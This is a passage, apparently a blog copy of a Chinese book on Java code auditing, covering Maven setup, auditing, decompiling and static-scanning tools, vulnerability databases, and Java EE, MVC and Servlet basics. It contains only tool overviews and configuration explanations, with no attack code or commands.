title="3．Maven的使用"></a>3．Maven的使用</h4><p>IDEA中可以在新建项目时选择创建Maven项目。如图2-58所示，选择创建Maven项目，右侧窗口显示的是Maven项目的模板。直接使用默认模板并单击“Next”按钮，如图2-59所示，填写Name（项目名称）和Location（项目保存路径）后单击“Finish”按钮，即可完成项目的创建。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192122804.png" alt="image-20220419212252613"></p><p>图2-58　创建Maven项目<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192123841.png" alt="image-20220419212311675"></p><p>图2-59　填写Maven项目的名称和保存路径</p><p>如图2-60所示，创建完成的Maven项目中包含该pom.xml文件。pom.xml文件描述了项目的Maven坐标、依赖关系、开发者需要遵循的规则、缺陷管理系统、组织以及licenses，还有其他所有的项目相关因素。对于安全人员来说，可以从pom.xml文件中审查当前Java应用程序是否使用了存在安全隐患的组件，以及快速搭建特定版本的漏洞环境。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192125652.png" alt="image-20220419212503436"></p><p>图2-60　pom.xml文件</p><p>例如搭建Fastjson 1.24之前版本的反序列化漏洞环境时，需要引入版本小于1.24的Fastjson组件，如前所述使用Maven搭建相应的环境，在pom.xml文件中填入Fastjson的项目通用名称、项目版本等信息，如图2-61所示。然后右键单击pom.xml文件选择“Maven”选项，并单击“Reimport”按钮，即可进行组件的自动获取，如图2-62所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192127341.png" alt="image-20220419212745155"></p><p>图2-61　填入项目名称和版本等信息<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192128818.png" alt="image-20220419212813604"></p><p>图2-62　自动获取组件</p><p>稍后，组件被下载至本地并且加入项目依赖中，就可以在项目代码中使用组件，如图2-63所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192129534.png" alt="image-20220419212946349"></p><p>图2-63　Maven依赖加载成功</p><h2 id="2-4-2-Swagger特点及使用"><a href="#2-4-2-Swagger特点及使用" class="headerlink" title="2.4.2　Swagger特点及使用"></a>2.4.2　Swagger特点及使用</h2><p>在前后端分析和开发中，为了减少与其他团队的沟通成本，通常会构建一份RESTful API文档来描述所有的接口信息，但是这种做法有很大的弊端，说明如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"> 1）编写RESTful文档工作量巨大。<br>（2）接口维护不方便，一旦接口发生变化，就需要修改文档。<br>（3）接口测试不方便，一般只能借助第三方工具来测试<br></code></pre></td></tr></table></figure><p>Swagger是一个开源软件框架，可以帮助开发人员设计、构建、记录和使用Restful Web应用，它将代码和文档融为一体，可以较好地解决上述问题，使开发人员将大部分精力集中于业务处理，而不是处理琐碎的文档。</p><p>启动项目，通过<a href="http://path/swagger-ui.html%E5%8F%AF%E4%BB%A5%E4%B8%BA%E5%89%8D%E7%AB%AF%E5%B1%95%E7%A4%BA%E7%9B%B8%E5%85%B3%E7%9A%84API%E6%96%87%E6%A1%A3%EF%BC%8C%E5%B9%B6%E5%83%8F%E4%BD%BF%E7%94%A8Postman%E4%BB%A5%E5%8F%8ACurl%E5%91%BD%E4%BB%A4%E4%B8%80%E6%A0%B7%EF%BC%8C%E9%80%9A%E8%BF%87Web%E7%95%8C%E9%9D%A2%E8%BF%9B%E8%A1%8C%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%EF%BC%8C%E5%A6%82%E5%9B%BE2-64%E6%89%80%E7%A4%BA%E3%80%82![image-20220419213246870](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192132078.png)">http://Path/swagger-ui.html可以为前端展示相关的API文档，并像使用Postman以及Curl命令一样，通过Web界面进行接口测试，如图2-64所示。![image-20220419213246870](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192132078.png)</a></p><p>图2-64　Swagger的API文档</p><h1 id="第3章-代码审计辅助工具简介"><a href="#第3章-代码审计辅助工具简介" class="headerlink" title="第3章　代码审计辅助工具简介"></a>第3章　代码审计辅助工具简介</h1><p>代码审计过程中或多或少会使用各种辅助工具，选择合适的工具可以起到事半功倍的效果。本章简单介绍几款代码编辑器、测试工具、静态代码扫描工具和反编译工具，读者可选择适合自己的工具进行更深入的了解。</p><h3 id="3-2-2-SwitchyOmega"><a href="#3-2-2-SwitchyOmega" class="headerlink" title="3.2.2　SwitchyOmega"></a>3.2.2　SwitchyOmega</h3><p>SwitchyOmega 是一款代理管理插件，支持Firefox和Chrome浏览器，并支持HTTP、HTTPS、socket4和socket5协议。在日常实际测试工作中，常需要切换代理，SwitchyOmega可以方便、快速地完成代理设置的切换，如图3-9所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192136063.png" alt="image-20220419213623888"></p><p>图3-9　SwitchyOmega界面截图</p><h3 id="3-2-4-apifox"><a href="#3-2-4-apifox" class="headerlink" title="3.2.4　apifox"></a>3.2.4　apifox</h3><h3 id="3-2-5-Postwomen"><a href="#3-2-5-Postwomen" class="headerlink" title="3.2.5　Postwomen"></a>3.2.5　Postwomen</h3><p>Postman是一款便捷的API接口调试工具，但是由于其高级功能需要付费，因此Postwomen应运而生。Postwomen是一个用于替代Postman且免费开源、轻量级、快速且美观的API调试工具。Postwomen由Node.js开发，除支持主流的Restful接口调试外，还支持GraphQL和WebSocket，其主界面如图3-14所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192140887.png" alt="image-20220419214014691"></p><p>图3-14　Postwomen界面截图</p><h3 id="3-2-6-Tamper-Data"><a href="#3-2-6-Tamper-Data" class="headerlink" title="3.2.6　Tamper Data"></a>3.2.6　Tamper Data</h3><p>Tamper Data是Firefox浏览器的一款Web安全测试插件，它的主要功能包括以下几种。</p><p>查看、修改HTTP&#x2F;HTTPS的请求头和请求参数。跟踪 HTTP 请求&#x2F;响应并记时，如图3-15所示。对 Web 站点进行安全测试。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192142060.png" alt="image-20220419214236867"></p><p>图3-15　Tamper Data界面截图</p><h3 id="3-2-7-Ysoserial"><a href="#3-2-7-Ysoserial" class="headerlink" title="3.2.7　Ysoserial"></a>3.2.7　Ysoserial</h3><p>Ysoserial是一款开源的Java反序列化测试工具，内部集成有多种利用链，可以快速生成用于攻击的代码，也可以将新公开的反序列化漏洞利用方式自行加入Ysoserial中，如图3-16所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192144640.png" alt="image-20220419214420047"></p><p>图3-16　Ysoserial界面截图</p><h3 id="3-2-8-Marshalsec"><a href="#3-2-8-Marshalsec" class="headerlink" title="3.2.8　Marshalsec"></a>3.2.8　Marshalsec</h3><p>Marshalsec是一款开源的Java反序列化测试工具，不仅可以生成各类反序列化利用链，还可以快速启动恶意的RMI服务等，如图3-17所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192145946.png" alt="image-20220419214555789"></p><p>图3-17　Marshalsec界面截图</p><h3 id="3-2-9-MySQL监视工具"><a href="#3-2-9-MySQL监视工具" class="headerlink" title="3.2.9　MySQL监视工具"></a>3.2.9　MySQL监视工具</h3><p>对于代码审计工作者来说，监视所执行的SQL记录是一件非常重要的事情。监视SQL执行记录不但能够使审计者了解SQL完整语句，还便于审计者去调试注入语句构造poc。本节将介绍几个常用的SQL语句监控工具。</p><h4 id="1．MySQL日志查询工具"><a href="#1．MySQL日志查询工具" class="headerlink" title="1．MySQL日志查询工具"></a>1．MySQL日志查询工具</h4><p>这是基于MySQL的日志查询、跟踪、分析工具。MySQL日志查询工具是易语言开发，功能比较简单，只需要输入服务器地址、数据库名称、数据库端口、数据库用户以及数据库密码，如图3-18所示，即可进入该软件的主界面，如图3-19所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192146333.png" alt="image-20220419214654123"></p><p>图3-18　MySQL日志查询工具数据库登录窗口<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192147206.png" alt="image-20220419214719028"></p><p>图3-19　MySQL日志查询工具</p><p>该工具拥有3个简单的功能，即日志参数设置（见图3-20）、用户权限设置（见图3-21）以及日志查询（见图3-22）功能。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192148741.png" alt="image-20220419214808511"></p><p>图3-20　日志参数设置<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192148146.png" alt="image-20220419214840092"></p><p>图3-21　用户权限设置<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192151385.png" alt="image-20220419215107113"></p><p>图3-22　日志查询</p><p>该工具的使用方法也很简单，确定数据库日志开启后，切换到日志查询界面，选择自动查询，当有 SQL 语句被执行时，会自动显示出执行的SQL语句，如图 3-23所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192152268.png" alt="image-20220419215240215"></p><p>图3-23　自动显示执行的SQL语句</p><h4 id="2．MySQL-Monitor"><a href="#2．MySQL-Monitor" class="headerlink" title="2．MySQL Monitor"></a>2．MySQL Monitor</h4><p>MySQL Monitor 是Web版本的SQL记录实时监控工具，其使用方法也很简单，只要将源代码上传到PHP环境中，输入数据库的账号和密码即可记录下SQL的执行语句，其主界面如图3-24所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192154102.png" alt="image-20220419215359481"></p><p>图3-24　MySQL Monitor界面截图</p><p>当执行SQL语句时，该工具会记录下所有的执行语句，如图3-25所示。</p><p>该工具的优点是不仅能够记录用户进行某些SQL操作时的语句，还能够详细地记录下站点运行时本身执行的SQL语句。当站点本身使用增删改查的功能时，该工具都可以记录下来，但是也正因为如此详尽，会导致一些冗余数据混淆其中，不便于审计者寻找用户执行的SQL语句。读者可根据自身的需要选择不同的监视工具。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192154907.png" alt="image-20220419215435845"></p><p>图3-25　MySQL Monitor记录下的执行语句</p><h2 id="3-3-反编译工具"><a href="#3-3-反编译工具" class="headerlink" title="3.3　反编译工具"></a>3.3　反编译工具</h2><p>在大多数情况下，需要审计的程序通常是一个.class文件或者Jar包，此时需要对程序进行反编译，以便于在进行代码审计时快速搜索关键字。</p><h3 id="3-3-1-JD-GUI"><a href="#3-3-1-JD-GUI" class="headerlink" title="3.3.1　JD-GUI"></a>3.3.1　JD-GUI</h3><p>JD-GUI是一款具有UI界面的反编译工具，界面简洁大方，使用简单方便，其主界面如图3-27所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192155060.png" alt="image-20220419215558020"></p><h3 id="3-3-2-FernFlower"><a href="#3-3-2-FernFlower" class="headerlink" title="3.3.2　FernFlower"></a>3.3.2　FernFlower</h3><p>FernFlower反编译工具的功能比JD-GUI更强大。该工具虽然没有UI界面，但可以配合系统指令完成批量反编译的工作。如图3-28所示，通过FernFlower反编译的tomcat-jini.jar的大小只有25 KB，此时通过解压软件解压出该Jar包即可得到完整的Java程序文件。需要注意的是，FernFlower在反编译失败的情况下会生成空的Java文件。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192159414.png" alt="image-20220419215938352"></p><p>图3-28　使用FernFlower进行反编译</p><h3 id="3-3-3-CFR"><a href="#3-3-3-CFR" class="headerlink" title="3.3.3　CFR"></a>3.3.3　CFR</h3><p>CFR也是功能强大的反编译工具，支持主流Java特性——Java8 lambda表达式，以及Java 7字符串切换。在某些JD-GUI无法反编译的情况下，CFR仍然能完美地进行反编译，也可以像FernFlower那样配合系统指令进行批量反编译。使用CFR进行反编译的截图如图3-29所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192200432.png" alt="image-20220419220036360"></p><h3 id="3-3-4-IntelliJ-IDEA"><a href="#3-3-4-IntelliJ-IDEA" class="headerlink" title="3.3.4　IntelliJ IDEA"></a>3.3.4　IntelliJ IDEA</h3><p>IntelliJ IDEA反编译工具能够自动解包已添加依赖的Jar包，并对其内容进行反编译。该工具拥有强大的动态调试和字符串匹配和搜索功能，为审计和调试漏洞的工作提供了极大便利。使用IntelliJ IDEA进行反编译的截图如图3-30所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192200109.png" alt="image-20220419220058030"></p><p>图3-30　使用IntelliJ IDEA的反编译功能</p><h2 id="3-4-Java代码静态扫描工具"><a href="#3-4-Java代码静态扫描工具" class="headerlink" title="3.4　Java代码静态扫描工具"></a>3.4　Java代码静态扫描工具</h2><h3 id="3-4-2-VCG"><a href="#3-4-2-VCG" class="headerlink" title="3.4.2　VCG"></a>3.4.2　VCG</h3><p>VisualCodeGrepper 简称VCG，它是基于 VB 开发的一款Windows下的白盒审计工具。VCG 支持多种语言，例如C&#x2F;C++、Java、C#、VB、PL&#x2F;SQL、PHP。VCG会根据代码中的变量名等信息动态生成针对该代码的漏洞规则，通过正则检查是否有和漏洞规则所匹配的代码，如图3-32所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192203939.png" alt="image-20220419220341841"></p><p>图3-32　VisualCodeGrepper界面截图</p><h3 id="3-4-3-FindBugs与FindSecBugs插件"><a href="#3-4-3-FindBugs与FindSecBugs插件" class="headerlink" title="3.4.3　FindBugs与FindSecBugs插件"></a>3.4.3　FindBugs与FindSecBugs插件</h3><p>FindBugs是一款Bug扫描插件，在IDEA和Eclipse中都可进行安装。FindBugs可以帮助开发人员发现代码缺陷，减少Bug，但其本身并不具备发现安全漏洞的能力，需要安装FindSecBugs拓展发现安全漏洞的能力，如图3-33所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192204206.png" alt="image-20220419220441132"></p><p>图3-33　FindSecBugs界面截图</p><h3 id="3-4-4-SpotBugs"><a href="#3-4-4-SpotBugs" class="headerlink" title="3.4.4　SpotBugs"></a>3.4.4　SpotBugs</h3><p>SpotBugs是FindBugs的继任者，所以二者用法基本一样，可以独立使用，也可以作为插件使用。SpotBugs需要运行在JDK1.8以上的版本，可以分析JDK1.0~1.9版本编译的Java程序，如图3-34所示。</p><p>除了本节所介绍的几款代码静态扫描工具外，还有收费的CheckMark、开源的Cobra等。这些工具或多或少存在误报、漏报等问题，只能起到辅助作用，更重要的是用户要对漏洞成因具有一定的理解，才能做好代码审计工作。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192208040.png" alt="image-20220419220824958"></p><p>图3-34　SpotBugs界面截图</p><h3 id="3-5-1-CVE"><a href="#3-5-1-CVE" class="headerlink" title="3.5.1　CVE"></a>3.5.1　CVE</h3><h3 id="3-5-2-NVD"><a href="#3-5-2-NVD" class="headerlink" title="3.5.2　NVD"></a>3.5.2　NVD</h3><p>NVD为美国国家通用漏洞数据库，同CVE一样会收录漏洞信息，并对收录的漏洞进行危害评级。NVD的官网如图3-37所示。</p><p>NVD的官网如图<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192213355.png" alt="image-20220419221346276"></p><h3 id="3-5-3-CNVD"><a href="#3-5-3-CNVD" class="headerlink" title="3.5.3　CNVD"></a>3.5.3　CNVD</h3><h3 id="3-5-4-CNNVD"><a href="#3-5-4-CNNVD" class="headerlink" title="3.5.4　CNNVD"></a>3.5.4　CNNVD</h3><p>CNNVD是中国国家信息安全漏洞库（China NationalVulnerability Database of Information Security），于2009年10月18日正式成立，是中国信息安全测评中心为切实履行漏洞分析和风险评估的职能，负责建设、运维的国家信息安全漏洞库，面向国家、行业和公众提供灵活多样的信息安全数据服务，为我国信息安全保障提供基础服务。CNNVD的漏洞信息页如图3-39所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192214172.png" alt="image-20220419221451114"></p><h1 id="第4章-Java-EE基础知识"><a href="#第4章-Java-EE基础知识" class="headerlink" title="第4章　Java EE基础知识"></a>第4章　Java EE基础知识</h1><p>Java平台有3个主要版本，分别是 Java SE（Java PlatformStandard Edition，Java平台标准版）、Java EE（JavaPlatform Enterprise Edition，Java平台企业版）和JavaME（Java Platform Micro Edition，Java平台微型版）。其中，Java EE是Java应用最广泛的版本。Java EE也称为Java 2Platform或Enterprise Edition（J2EE），2018年3月更名为Jakarta EE。Java EE是Sun公司为企业级应用推出的标准平台，用来开发B&#x2F;S架构软件。Java EE可以说是一个框架，也可以说是一种规范。</p><h2 id="4-1-Java-EE分层模型"><a href="#4-1-Java-EE分层模型" class="headerlink" title="4.1　Java EE分层模型"></a>4.1　Java EE分层模型</h2><p>Web开发诞生之初都是静态的HTML页面，后来随着需求大量增长和技术快速发展，逐渐出现了数据库和动态页面，但是没有分层概念。当时的开发者在开发项目时，会把所有的代码都写在页面上，包括数据库连接代码、事务控制代码以及各种校验和逻辑控制代码等。如果项目规模巨大，一个文件可能有上万行代码。如果开发人员需要修改业务功能或者定位Bug，会有非常大的麻烦，可维护性差。随着时间的推移，Java EE 分层模型应运而生。</p><h3 id="4-1-1-Java-EE的核心技术"><a href="#4-1-1-Java-EE的核心技术" class="headerlink" title="4.1.1　Java EE的核心技术"></a>4.1.1　Java EE的核心技术</h3><p>Java EE 的核心技术有很多，包括JDBC、JNDI、EJB、RMI、Servlet、JSP、XML、JMS、Java IDL、JTS、JTA、JavaMail和JAF。由于篇幅有限，这里仅解释部分常用技术的释义。</p><p>&#x3D;&#x3D;Java数据库连接（Java Database Connectivity，JDBC）&#x3D;&#x3D;在 Java 语言中用来规范客户端程序如何访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。</p><p>&#x3D;&#x3D;Java命名和目录接口（Java Naming and DirectoryInterface，JNDI）&#x3D;&#x3D;是 Java 的一个目录服务应用程序界面（API），它提供了一个目录系统，并将服务名称与对象关联起来，从而使开发人员在开发过程中可以用名称来访问对象</p><p>&#x3D;&#x3D;企业级JavaBean（Enterprise JavaBean，EJB）&#x3D;&#x3D;是一个用来构筑企业级应用的、在服务器端可被管理的组件。</p><p>&#x3D;&#x3D;远程方法调用（Remote Method Invocation，RMI）&#x3D;&#x3D;是Java的一组拥护开发分布式应用程序的API，它大大增强了Java开发分布式应用的能力。</p><p>&#x3D;&#x3D;Servlet（Server Applet）&#x3D;&#x3D;是使用Java编写的服务器端程序。狭义的Servlet是指 Java 语言实现的一个接口，广义的Servlet是指任何实现该Servlet接口的类。其主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。</p><p>&#x3D;&#x3D;JSP（JavaServer Pages）&#x3D;&#x3D;是由Sun公司主导并创建的一种动态网页技术标准。JSP 部署于网络服务器上，可以响应客户端发送的请求，并根据请求内容动态生成 HTML、XML 或其他格式文档的 Web 网页，然后返回给请求者。</p><p>&#x3D;&#x3D;可扩展标记语言（eXtensible Markup Language，XML）&#x3D;&#x3D;是被设计用于传输和存储数据的语言。</p><p>&#x3D;&#x3D;Java消息服务（Java Message Service，JMS）&#x3D;&#x3D;是一个Java平台中关于面向消息中间件（MOM）的API，用于在两个应用程序之间或分布式系统中发送消息，进行异步通信。</p><h3 id="4-1-2-Java-EE分层模型"><a href="#4-1-2-Java-EE分层模型" class="headerlink" title="4.1.2　Java EE分层模型"></a>4.1.2　Java EE分层模型</h3><p>Java EE 应用的分层模型主要分为以下5层。</p><p>&#x3D;&#x3D;Domain Object（领域对象）层&#x3D;&#x3D;：本层由一系列POJO（Plain Old Java Object，普通的、传统的Java对象）组成，这些对象是该系统的Domain Object，通常包含各自所需实现的业务逻辑方法。</p><p>&#x3D;&#x3D;DAO（Data Access Object，数据访问对象）层&#x3D;&#x3D;：本层由一系列 DAO 组件组成，这些DAO实现了对数据库的创建、查询、更新和删除等操作。</p><p>&#x3D;&#x3D;Service（业务逻辑）层&#x3D;&#x3D;：本层由一系列的业务逻辑对象组成，这些业务逻辑对象实现了系统所需要的业务逻辑方法。</p><p>&#x3D;&#x3D;Controller（控制器）层&#x3D;&#x3D;：本层由一系列控制器组成，这些控制器用于拦截用户的请求，并调用业务逻辑组件的业务逻辑方法去处理用户请求，然后根据处理结果向不同的View组件转发。</p><p>&#x3D;&#x3D;View（表现）层&#x3D;&#x3D;：本层由一系列的页面及视图组件组成，负责收集用户请求，并显示处理后的结果。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192237402.png" alt="image-20220419223746357"></p><p>图4-1　分层模型</p><p>Java EE分层模型的应用，使得项目易于维护，管理简化，并且适应大规模和复杂的应用需求以及不断变化的业务需求。此外，分层模型还能有效提高系统并发处理能力。</p><h2 id="4-2-了解MVC模式与MVC框架"><a href="#4-2-了解MVC模式与MVC框架" class="headerlink" title="4.2　了解MVC模式与MVC框架"></a>4.2　了解MVC模式与MVC框架</h2><p>在对某一项目进行代码审计时，我们需要从其输入、处理和输出来审计漏洞，遵循MVC（Model View Controller）思想。在 MVC 应用程序中，有3个主要的核心部件，分别是模型、视图、控制器，它们独立处理各自的任务，这种分离的思想使得我们在审计时能够抓住关键问题，而不用关心类似于界面显示等无关紧要的问题。本节将介绍 MVC 的模式以及Java中采用MVC模式的一些框架。</p><h3 id="4-2-1-Java-MVC-模式"><a href="#4-2-1-Java-MVC-模式" class="headerlink" title="4.2.1　Java MVC 模式"></a>4.2.1　Java MVC 模式</h3><h4 id="1．MVC的概念"><a href="#1．MVC的概念" class="headerlink" title="1．MVC的概念"></a>1．MVC的概念</h4><p>MVC模式最早在1978年提出，是施乐帕克研究中心（XeroxPARC）在20世纪80年代为程序语言Smalltalk发明的一种软件架构。MVC 全名是 Model View Controller，M（Model）是指数据模型，V（View）是指用户界面，C（Controller）是控制器。使用 MVC 最直接的目的就是将M和V实现代码分离，C 则是确保 M 和 V 的同步，一旦 M 改变，V就应该同步更新。简单来说，MVC是一个设计模式，它强制性地使应用程序的输入、处理和输出分开。MVC应用程序被分成3个核心部件：Model、View、Controller。它们独立处理各自的任务。</p><p>Java MVC模式与普通 MVC 的区别不大，具体如下。</p><p>&#x3D;&#x3D;模型（Model）&#x3D;&#x3D;：表示携带数据的对象或Java POJO。即使模型内的数据改变，它也具有逻辑来更新控制器。</p><p>&#x3D;&#x3D;控制器（Controller）&#x3D;&#x3D;：表示逻辑控制，控制器对模型和视图都有作用，控制数据流进入模型对象，并在数据更改时更新视图，是视图和模型的中间层。</p><p>&#x3D;&#x3D;视图（View）&#x3D;&#x3D;：表示模型包含的数据的可视化层。</p><h4 id="2．MVC工作流程"><a href="#2．MVC工作流程" class="headerlink" title="2．MVC工作流程"></a>2．MVC工作流程</h4><p>MVC的工作流程也很容易理解。首先，Controller层接收用户的请求，并决定应该调用哪个Model来进行处理；然后，由Model使用逻辑处理用户的请求并返回数据；最后，返回的数据通过View层呈现给用户。具体流程如图4-2所示。</p><p>MVC模式使视图层和业务层分离，以便更改View层代码时，不用重新编译Model和Controller代码。同样，当某个应用的业务流程或者业务规则发生改变时，只需要改动Model层即可实现需求。此外，MVC模式使得Web应用更易于维护和修改，有利于通过工程化、工具化管理应用程序代码。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192250450.png" alt="image-20220419225024390"></p><p>图4-2　MVC的工作流程</p><h3 id="4-2-2-Java-MVC框架"><a href="#4-2-2-Java-MVC框架" class="headerlink" title="4.2.2　Java MVC框架"></a>4.2.2　Java MVC框架</h3><p>Java MVC的框架有很多，如比较经典的Struts1框架、Struts2框架、Spring MVC框架，此外还有小众的JSF框架以及Tapestry 框架。下面简单介绍这些框架。</p><p>&#x3D;&#x3D;Struts1框架&#x3D;&#x3D;：Struts是较早的Java开源框架之一，它是MVC设计模式的一个优秀实现。Struts1框架基于MVC模式定义了通用的Controller，通过配置文件分离了 Model 和View，通过Action对用户请求进行了封装，使代码更加清晰、易读，整个项目也更易管理。</p><p>&#x3D;&#x3D;Struts2框架&#x3D;&#x3D;：Struts2 框架并不是单纯由 Struts1版本升级而来，而是Apache根据一个名为 WebWork 的项目发展而来的，所以两者的关系并不大。Struts2 框架同样是一个基于MVC 设计模式的 Web 应用框架，它本质上相当于一个Servlet。在MVC设计模式中，Struts2 作为控制器来建立模型与视图的数据交互。</p><p>&#x3D;&#x3D;Spring MVC框架&#x3D;&#x3D;：Spring MVC是一个基于MVC思想的优秀应用框架,它是Spring的一个子框架，也是一个非常优秀的MVC框架。Spring MVC 角色划分清晰，分工明细，并且与Spring 框架无缝结合。作为当今业界最主流的 Web 开发框架，Spring MVC 框架已经成为当前最热门的开发技能之一，同时也广泛用于桌面开发领域。</p><p>&#x3D;&#x3D;JSF&#x3D;&#x3D;&#x3D;&#x3D;框架&#x3D;&#x3D;：JSF 框架是一个用于构建Java Web 应用程序的标准框架，也是一个MVC Web 应用框架，它提供了一种以组件为中心的用户界面（UI）构建方法，从而简化了Java服务器端应用程序的开发。</p><p>&#x3D;&#x3D;Tapestry 框架&#x3D;&#x3D;：Tapestry 框架也是一种基于Java的Web应用程序框架，与上述4款框架相比，Tapestry 并不是一种单纯的MVC框架，它更像MVC框架和模板技术的结合，不仅包含前端的MVC框架，还包含一种视图层的模板技术，并使用Tapestry完全与Servlet&#x2F;JSP API分离，是一种非常优秀的设计。相对于现有的其他Web应用程序框架而言，Tapestry框架会帮助开发者从烦琐的、不必要的底层代码中解放出来。</p><h2 id="4-3-Java-Web的核心技术——Servlet"><a href="#4-3-Java-Web的核心技术——Servlet" class="headerlink" title="4.3　Java Web的核心技术——Servlet"></a>4.3　Java Web的核心技术——Servlet</h2><p>Servlet其实是在 Java Web容器中运行的小程序。用户通常使用 Servlet 来处理一些较为复杂的服务器端的业务逻辑。Servlet原则上可以通过任何客户端-服务器协议进行通信，但是它们常与HTTP一起使用，因此，“Servlet”通常用作“HTTP servlet”的简写。Servlet 是 Java EE的核心，也是所有MVC框架实现的根本。本节将对 Servlet 的相关知识进行介绍。</p><h3 id="4-3-1-Servlet-的配置"><a href="#4-3-1-Servlet-的配置" class="headerlink" title="4.3.1　Servlet 的配置"></a>4.3.1　Servlet 的配置</h3><p>版本不同，Servlet的配置不同。Servlet 3.0之前的版本都是在web.xml中配置的，而Servlet 3.0之后的版本则使用更为便捷的注解方式来配置。此外，不同版本的Servlet所需的Java&#x2F;JDK版本也不相同，具体如表4-1所示。</p><p>表4-1　Servlet版本及其对应的Java版本<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192304970.png" alt="image-20220419230435889"></p><h4 id="1．基于web-xml"><a href="#1．基于web-xml" class="headerlink" title="1．基于web.xml"></a>1．基于web.xml</h4><p>图4-3所示是一个基于web.xml的Servlet配置。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192305139.png" alt="image-20220419230503058"></p><p>图4-3　web.xml的Servlet配置</p><p>在 web.xml 中，Servlet的配置在 Servlet 标签中，Servlet标签是由Servlet和Servlet-mapping标签组成，两者通过在Servlet和Servlet-mapping标签中相同的 Servlet-name名称实现关联，在图4-3中的标签含义如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;servlet&gt;：声明 Servlet 配置入口。<br>&lt;description&gt;：声明Servlet描述信息。<br>&lt;display-name&gt;：定义Web应用的名字。<br>&lt;servlet-name&gt;：声明Servlet名称以便在后面的映射时使用。<br>&lt;servlet-class&gt;：指定当前servlet对应的类的路径。<br>&lt;servlet-mapping&gt;：注册组件访问配置的路径入口。<br>&lt;servlet-name&gt;：指定上文配置的Servlet的名称<br>&lt;url-pattern&gt;：指定配置这个组件的访问路径。<br></code></pre></td></tr></table></figure><h4 id="2．基于注解方式"><a href="#2．基于注解方式" class="headerlink" title="2．基于注解方式"></a>2．基于注解方式</h4><p>Servlet 3.0以上的版本中，开发者无须在web.xml里面配置Servlet，只需要添加@WebServlet 注解即可修改 Servlet 的属性，如图4-4所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192325172.png" alt="image-20220419232513090"></p><p>图4-4　基于注解方式配置Servlet</p><p>可以看到第13行@WebServlet的注解参数有description及urlPatterns，除此之外还有很多参数，具体如表4-2所示。</p><p>表4-2　基于注解方式的注解参数<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192325856.png" alt="image-20220419232543773"></p><p>由此可以看出，web.xml可以配置的Servlet属性，都可以通过@WebServlet的方式进行配置。</p><h3 id="4-3-2-Servlet的访问流程"><a href="#4-3-2-Servlet的访问流程" class="headerlink" title="4.3.2　Servlet的访问流程"></a>4.3.2　Servlet的访问流程</h3><p>以图4-3为例，在该 Servlet配置中，其访问流程如图4-5所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192328488.png" alt="image-20220419232807436"></p><p>图4-5　Servlet的访问流程</p><p>首先在浏览器地址栏中输入user，即访问url-pattern 标签中的值；然后浏览器发起请求，服务器通过servlet-mapping标签中找到文件名为user的url-pattern，通过其对应的servlet-name寻找servlet标签中servlet-name相同的servlet；再通过servlet 标签中的servlet-name，获取 servlet-class参数；最后得到具体的class文件路径，继而执行servlet-class标签中class文件的逻辑。</p><p>从上述过程可以看出，servlet和servlet-mapping中都含有<servlet-name> </servlet-name>标签，其主要原因是通过servlet-name作为纽带，将servlet-class 和 url-pattern 构成联系，从而使URL映射到 servlet-class 所指定的类中执行相应逻辑。</p><h3 id="4-3-3-Servlet的接口方法"><a href="#4-3-3-Servlet的接口方法" 